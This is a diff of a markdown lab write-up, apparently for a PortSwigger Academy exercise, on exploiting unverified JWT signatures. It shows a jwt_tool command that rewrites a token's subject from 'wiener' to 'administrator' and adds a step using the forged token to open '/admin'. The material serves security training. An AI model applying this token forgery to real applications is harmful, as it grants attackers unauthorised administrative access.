@@ -126,7 +126,7 @@ nbf = NotBefore
 ----------------------
 ```
 
-2. Tamper value "wiener" to the "administrator" value using **jwt_tool**.
+2. Tamper "wiener" value to the "administrator" value using **jwt_tool**.
 
 ```bash
 ─$ python3 jwt_tool.py eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoid2llbmVyIn0.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg -T
@@ -192,3 +192,8 @@ jwttool_084845f9c257880a92a7af8fae9224c1 - Tampered token:
 [+] eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg
 ```
 
+3. Use Tampered JWT to access "/admin" page.
+
+<img align="center" src="screenshots/jwt_vulns/unverified_signature/not_tampered.png">
+
+<img align="center" src="screenshots/jwt_vulns/unverified_signature/tampered.png">
